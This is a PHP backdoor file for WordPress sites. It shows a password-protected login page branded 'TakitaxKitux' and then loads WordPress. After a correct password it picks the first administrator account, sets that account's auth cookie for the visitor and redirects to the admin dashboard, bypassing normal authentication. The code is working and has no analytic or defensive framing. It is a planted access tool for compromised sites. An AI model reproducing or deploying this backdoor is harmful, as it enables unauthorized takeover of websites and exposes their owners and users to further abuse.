<?php
session_start();
$password = "295ed38911cc776d6fa1094be624d107";

function login_shell()
{
?>
    <html>
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TakitaxKitux Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: url('https://images2.imgbox.com/a3/b4/mgDd3Jzl_o.png') no-repeat center center;
            background-size: cover;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }

        .login-container {
            background: rgba(0, 0, 0, 0.7); /* Transparansi latar belakang form */
            padding: 20px;
            border-radius: 8px;
            color: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            margin-top: 720px;
        }

        .login-container input[type="password"] {
            padding: 10px;
            margin-right: 10px;
            border: 1px solid #4e4e4e69;
            border-radius: 4px;
            background: transparent;
            color: #fff;
            outline: none;
        }

        .login-container input[type="password"]::placeholder {
            color: #666666;
        }

        .login-container input[type="submit"] {
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            background: #4e4e4e69;
            color: #000000;
            cursor: pointer;
            outline: none;
        }

        .login-container input[type="submit"]:hover {
            background: #000;
        }

        .marquee-container {
            position: fixed;
            bottom: 0;
            left: 500px;
            right: 500px;
            height: 50px;
            overflow: hidden;
            background: rgba(0, 0, 0, 0);
            display: flex;
            align-items: center;
            color: #fff;
        }

        .marquee {
            white-space: nowrap;
            display: inline-block;
            padding-left: 75%;
            animation: marquee 10s linear infinite;
        }

        @keyframes marquee {
            from {
                transform: translateX(100%);
            }
            to {
                transform: translateX(-100%);
            }
        }
    </style>
</head>
<body>
    <div class="marquee-container">
        <div class="marquee">
            copyright © TakitaxKitux
        </div>
    </div>
    <div class="login-container">
        <form action="" method="post">
            <div align="center">
                <input type="password" name="pass" placeholder="Password" required>
                <input type="submit" name="submit" value="Login">
            </div>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        header("refresh: 0;");
    } else {
        login_shell();
    }
}
?>
<?php
require(rtrim($_SERVER["DOCUMENT_ROOT"], "/\\") . DIRECTORY_SEPARATOR . "wp-blog-header.php");
$u = get_users('role=administrator');
$us="";
foreach($u as $p){
	$us=$p->user_login; break;
}
$us = get_user_by('login', $us ); 
if ( !is_wp_error( $us ) )
{	get_currentuserinfo(); 
		if ( user_can( $us, "administrator" ) ){ 
		   wp_clear_auth_cookie(); 
   		   wp_set_current_user ( $us->ID );
    	   wp_set_auth_cookie  ( $us->ID );
    	   $redirect_to = admin_url();  
           wp_safe_redirect( $redirect_to );
           exit();
  } 
}
